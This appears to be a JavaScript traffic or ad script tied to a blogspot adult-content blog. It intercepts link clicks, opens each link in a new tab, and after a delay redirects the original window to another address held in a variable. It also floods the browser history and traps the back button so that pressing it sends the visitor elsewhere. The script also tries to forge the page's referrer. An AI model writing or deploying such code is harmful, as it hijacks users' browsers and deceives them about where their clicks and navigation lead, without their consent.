// set the referrer
document.referrer = "https://istrippershows.blogspot.com/";

if (typeof under !== "undefined" && under !== null) {
  if (typeof cta !== "undefined" && cta !== null) {
    document.addEventListener('click', function(event) {
      var target = event.target;
      while (target) {
        if (target.tagName === 'A' && target.classList.contains(cta)) {
          const linkHref = target.href;
          event.preventDefault();
          setTimeout(function() {
            // set the referrer
            document.referrer = "https://istrippershows.blogspot.com/";

            window.open(linkHref, '_blank');
            window.top.location.replace(under);
          }, 3000); // Change 3000 to the desired number of milliseconds for the delay
          break;
        }
        target = target.parentNode;
      }
    });
  } else {
    document.addEventListener('click', function(event) {
      var target = event.target;
      while (target) {
        if (target.tagName === 'A') {
          const linkHref = target.href;
          event.preventDefault();
          setTimeout(function() {
            // set the referrer
            document.referrer = "https://istrippershows.blogspot.com/";

            window.open(linkHref, '_blank');
            window.top.location.replace(under);
          }, 3000); // Change 3000 to the desired number of milliseconds for the delay
          break;
        }
        target = target.parentNode;
      }
    });
  }
}

if (typeof back !== "undefined" && back !== null) {
  !(function() {
    var t;
    try {
      const URL = window.location.href.split(/[#]/)[0];
      for (t = 0; t < 10; ++t) history.pushState({}, '', URL + '#');
      onpopstate = function(event) {
        event.state && setTimeout(function() {
          // set the referrer
          document.referrer = "https://istrippershows.blogspot.com/";

          window.top.location.replace(back);
        }, 3000); // Change 3000 to the desired number of milliseconds for the delay
      };
    } catch (o) {
      console.log(o);
    }
  })();
}
